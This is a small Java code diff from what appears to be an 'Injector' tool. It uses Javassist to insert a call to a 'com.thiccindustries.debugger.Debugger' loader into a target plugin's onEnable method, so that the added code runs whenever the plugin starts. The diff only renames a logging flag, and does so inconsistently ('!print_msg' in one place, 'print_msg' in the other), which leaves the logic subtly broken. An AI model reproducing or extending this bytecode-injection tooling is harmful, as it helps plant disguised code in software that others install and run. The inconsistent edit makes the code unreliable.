@@ -168,13 +168,13 @@ public class Injector {
 
             //Get main class, and find onEnable method
 
-            if(!quiet)
+            if(!print_msg)
                 System.out.println("[Injector] Injecting debugger loader into class.");
 
             CtClass cc = pool.get(mainClass);
             CtMethod m = cc.getDeclaredMethod("onEnable");
 
-            if(!quiet)
+            if(print_msg)
                 System.out.println("{ new com.thiccindustries.debugger.Debugger(this, " + "\"" + config.prefix + "\", " + (config.injectOther ? "true" : "false") + "," + (config.warnings ? "true" : "false") +"); }");
             m.insertAfter("{ new com.thiccindustries.debugger.Debugger(this, " + "\"" + config.prefix + "\", " + (config.injectOther ? "true" : "false") + "," + (config.warnings ? "true" : "false") +"); }");
 
